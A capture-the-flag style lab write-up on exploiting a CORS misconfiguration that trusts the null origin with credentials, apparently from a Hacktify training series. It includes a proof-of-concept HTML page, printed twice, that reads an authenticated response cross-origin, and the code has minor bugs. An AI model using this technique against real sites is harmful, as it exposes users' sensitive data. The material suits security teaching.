# Lab 2: CORS with Null origin

## Introduction to the Lab

This lab is focused to show you how an null/no origin can lead to leak sensitive information in a web application. In this lab we will learn how an attacker can use no origin  to make a malicious request and fetch sensitive information from the web application.

## Steps to Reproduce:

We are given with a page which shows something like this,

![Lab%202%20CORS%20with%20Null%20origin%20ab28c75dd6b34928bc6fbcf558235c5f/Untitled.png](Lab%202%20CORS%20with%20Null%20origin%20ab28c75dd6b34928bc6fbcf558235c5f/Untitled.png)

Let's capture this request in our burpsuite and send it to the repeater. 

![Lab%202%20CORS%20with%20Null%20origin%20ab28c75dd6b34928bc6fbcf558235c5f/Untitled%201.png](Lab%202%20CORS%20with%20Null%20origin%20ab28c75dd6b34928bc6fbcf558235c5f/Untitled%201.png)

We can see that we have been asked to fetch the HTTP response of the web application we are dealing with. 

But, unlike in the previous lab we are getting two headers interesting headers in the response which are `access-control-allow-origin: null` & `access-control-allow-credentials: true`

![Lab%202%20CORS%20with%20Null%20origin%20ab28c75dd6b34928bc6fbcf558235c5f/Untitled%202.png](Lab%202%20CORS%20with%20Null%20origin%20ab28c75dd6b34928bc6fbcf558235c5f/Untitled%202.png)

Great, this made our work more easy! Isn't it? We don't need to add any headers and still we can access sensitive data from anywhere being completely anonymous. 

This is where the problem lies, this shouldn't happen, there must be some protection to prevent this behaviour.

Well, if everything is crystal clear we don't need to do anything. We just have to exploit it with the code we have used earlier. Make sure you change the url specified in the HTML exploit to your lab url.

Time to Exploit :D

We will use the same HTML code given in the documentation, i.e)

```jsx
<!DOCTYPE html>
<html>
   <head>
      <script>
         function cors() {
          var xhttp = new XMLHttpRequest();
            xhttp.onreadystatechange = function() {
              if (this.readyState == 4 && this.status == 200) {
                document.getElementById("emo").innerHTML = alert(this.responseText);
          }
         };
         xhttp.open("GET", "https://labs.hacktify.in/null_origin.php", true);
         xhttp.withCredentials = true;
         xhttp.send();
         }
      </script>
   </head>
   <body>
      <center>
      <h2>CORS PoC Exploit </h2>
      <h3>Show full content of page</h3>
      <div id="demo">
         <button type="button" onclick="cors()">Exploit</button>
      </div>
   </body>
</html>
```

Now open the HTML file on your browser and hit exploit,

![Lab%201%20CORS%20With%20Arbitrary%20Origin%2082bcc7f59f4146f092cc47391641145c/Untitled%203.png](Lab%201%20CORS%20With%20Arbitrary%20Origin%2082bcc7f59f4146f092cc47391641145c/Untitled%203.png)

Can you see you got a pop up?

![Lab%201%20CORS%20With%20Arbitrary%20Origin%2082bcc7f59f4146f092cc47391641145c/Untitled%204.png](Lab%201%20CORS%20With%20Arbitrary%20Origin%2082bcc7f59f4146f092cc47391641145c/Untitled%204.png)

We have exploited this lab successfully.

## Payload(s) Used:

This given code can be used to exploit CORS in this lab.

```jsx
<!DOCTYPE html>
<html>
   <head>
      <script>
         function cors() {
          var xhttp = new XMLHttpRequest();
            xhttp.onreadystatechange = function() {
              if (this.readyState == 4 && this.status == 200) {
                document.getElementById("emo").innerHTML = alert(this.responseText);
          }
         };
         xhttp.open("GET", "https://labs.hacktify.in/null_origin.php", true);
         xhttp.withCredentials = true;
         xhttp.send();
         }
      </script>
   </head>
   <body>
      <center>
      <h2>CORS PoC Exploit </h2>
      <h3>Show full content of page</h3>
      <div id="demo">
         <button type="button" onclick="cors()">Exploit</button>
      </div>
   </body>
</html>
```

## Conclusion

This lab was based on a simple demonstration of how an attacker can use this bad implementation  to fetch sensitive information from a web application. This is again a most basic implementation flaw that generally developers make. We will look into more complex cases in the coming labs.